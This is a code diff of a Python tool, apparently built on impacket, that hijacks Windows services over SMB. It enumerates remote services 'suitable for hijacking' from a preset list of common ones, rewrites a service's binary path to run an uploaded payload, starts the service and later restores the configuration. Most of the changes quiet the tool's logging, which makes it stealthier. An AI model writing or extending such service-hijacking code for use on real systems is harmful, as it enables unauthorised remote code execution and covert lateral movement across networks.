@@ -71,7 +71,7 @@ class ServiceChanger:
 
     def openSvcManager(self):
         """Open Service Control Manager"""
-        LOG.info("Opening SVCManager on %s....." % self.connection.getRemoteHost())
+        #LOG.info("Opening SVCManager on %s....." % self.connection.getRemoteHost())
         
         self._rpctransport = transport.SMBTransport(
             self.connection.getRemoteHost(), 
@@ -94,7 +94,7 @@ class ServiceChanger:
 
     def getServiceInfo(self, service_name, scm_handle):
         """Get detailed information about a specific service"""
-        LOG.info("Querying service %s" % service_name)
+        LOG.debug("Querying service %s" % service_name)
         service_info = ServiceInfo()
         service_info.service_name = service_name
         
@@ -232,25 +232,39 @@ class ServiceChanger:
             LOG.error("Error in isServiceSuitable for %s: %s" % (service_info.service_name, str(e)))
             return False
 
-    def listAllServices(self):
-        """List all services and mark suitable ones for hijacking"""
-        LOG.info("Listing all services on %s....." % self.connection.getRemoteHost())
+    def listServices(self, list_all=False):
+        """List services and mark suitable ones for hijacking"""
         
         try:
             scm_handle = self.openSvcManager()
             services = scmr.hREnumServicesStatusW(self.rpcsvc, scm_handle)
             
+            common_services = ["ssh-agent", "AppVClient", "SensorDataService", "UevAgentService", "WSearch", "COMSysApp", "msiserver", "SgrmBroker", "TieringEngineService", "vds", "VSS", "wmiApSrv", "RSoPProv", "VirtIO-FS Service", "GameInputSvc", "perceptionsimulation", "wbengine", "edgeupdatem", "MicrosoftEdgeElevationService"]
             service_list = []
             suitable_count = 0
             
-            for service in services:
-                service_info = self.getServiceInfo(service['lpServiceName'], scm_handle)
-                if service_info.service_name:
+            if list_all:
+                LOG.info("Listing all services on %s....." % self.connection.getRemoteHost())
+                for service in services:
+                    service_info = self.getServiceInfo(service['lpServiceName'], scm_handle)
+                    if service_info.service_name:
+                        is_suitable = self.isServiceSuitable(service_info)
+                        if is_suitable:
+                            service_list.append(service_info)
+                            suitable_count += 1
+
+            else:
+                LOG.info("Listing most common services on %s....." % self.connection.getRemoteHost())
+                for service in common_services:
+                    service_info = self.getServiceInfo(service, scm_handle)
+                    if not service_info:
+                        LOG.debug("No info for service %s", service)
+                        continue
                     is_suitable = self.isServiceSuitable(service_info)
                     if is_suitable:
                         service_list.append(service_info)
                         suitable_count += 1
-            
+
             scmr.hRCloseServiceHandle(self.rpcsvc, scm_handle)
             LOG.info("Suitable for hijacking: %d" % suitable_count)
             return service_list
@@ -350,8 +364,8 @@ class ServiceChanger:
                 scmr.NULL
             )
             
-            LOG.info("Service configuration modified successfully")
-            LOG.info("Starting service to execute payload...")
+            LOG.debug("Service configuration modified successfully")
+            #LOG.debug("Starting service to execute payload...")
             scmr.hRStartServiceW(self.rpcsvc, service_handle)
             
             scmr.hRCloseServiceHandle(self.rpcsvc, service_handle)
@@ -407,7 +421,7 @@ class ServiceChanger:
     def restoreServiceConfig(self, service_name, original_config):
         """Restore original service configuration"""
         # Restore service to original state after hijacking
-        LOG.info("Restoring original service configuration for %s..." % service_name)
+        #LOG.info("Restoring original service configuration for %s..." % service_name)
         
         scm_handle = None
         service_handle = None
@@ -425,7 +439,7 @@ class ServiceChanger:
             
             resp = scmr.hROpenServiceW(self.rpcsvc, scm_handle, service_name + '\x00')
             service_handle = resp['lpServiceHandle']
-            LOG.info("Restoring service configuration...")
+            LOG.info(f"Restoring service configuration for {service_name}:")
             LOG.info("  - Binary Path: %s" % original_config.binary_path_name)
             LOG.info("  - Start Type: %d" % original_config.start_type)
             LOG.info("  - Start Name: %s" % original_config.start_name)
@@ -463,7 +477,7 @@ class ServiceChanger:
 
     def getShares(self):
         """Get available shares on target"""
-        LOG.info("Requesting shares on %s....." % (self.connection.getRemoteHost()))
+        LOG.debug("Requesting shares on %s....." % (self.connection.getRemoteHost()))
         try:
             self._rpctransport = transport.SMBTransport(self.connection.getRemoteHost(),
                                                         self.connection.getRemoteHost(),
@@ -525,8 +539,8 @@ class ServiceChanger:
             fh.close()
             
             self.uploaded_files.append(remote_filename)
-            LOG.info("File uploaded successfully")
-            return True
+            LOG.debug("File uploaded successfully")
+            return remote_filename
             
         except Exception as e:
             LOG.critical("Error uploading file %s: %s" % (local_file, str(e)))
@@ -538,6 +552,7 @@ class ServiceChanger:
             return
         
         LOG.info("Cleaning up uploaded files...")
+        time.sleep(2)
         for filename in self.uploaded_files:
             try:
                 self.connection.deleteFile(self.share, filename)
